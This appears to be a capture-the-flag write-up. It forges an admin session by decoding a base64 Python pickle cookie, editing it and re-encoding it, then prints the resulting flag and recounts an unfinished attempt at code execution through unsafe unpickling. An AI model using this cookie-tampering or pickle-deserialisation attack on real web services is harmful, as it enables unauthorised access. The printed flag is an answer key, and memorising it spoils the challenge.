@@ -1,0 +1,29 @@
+we get a base64 encoded python pickle hinted in the cookie name:
+KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu
+
+>>> pic = "KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu"
+>>> test = pickle.loads(base64.b64decode(pic))
+>>> test
+{'python': 'pickles', 'subtle': 'hint', 'user': None}
+>>> test['user'] = "admin"
+>>> test
+{'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}
+>>> base64.b64encode(pickle.dumps(test))
+
+set the cookie to the result:
+gAN9cQAoWAYAAABzdWJ0bGVxAVgEAAAAaGludHECWAQAAAB1c2VycQNYBQAAAGFkbWlucQRYBgAAAHB5dGhvbnEFWAcAAABwaWNrbGVzcQZ1Lg==
+
+Your flag is CTF{but_wait,theres_more.if_you_call} ... but is there more(1)? or less(1)?
+
+hints at code execution in unsafe pickling
+
+tried my best to solve this "extra" challenge, but I have no idea why it
+wouldn't work. code execution worked fine locally, so it must have been
+sandboxed in some way (and the more/less thing is probably relevant but I was
+too tired to think about that). the server would throw 500's when the user was
+not set properly, so I tried the payload in another variable in the dict.
+I thought about creating a custom dict object in the pickle, that then runs the
+payload when it tries to access its members, but didn't have time.
+maybe it's something to do with getting information out about the current
+functions available in the python program on the server, where either the flag
+is contained or they have access to?
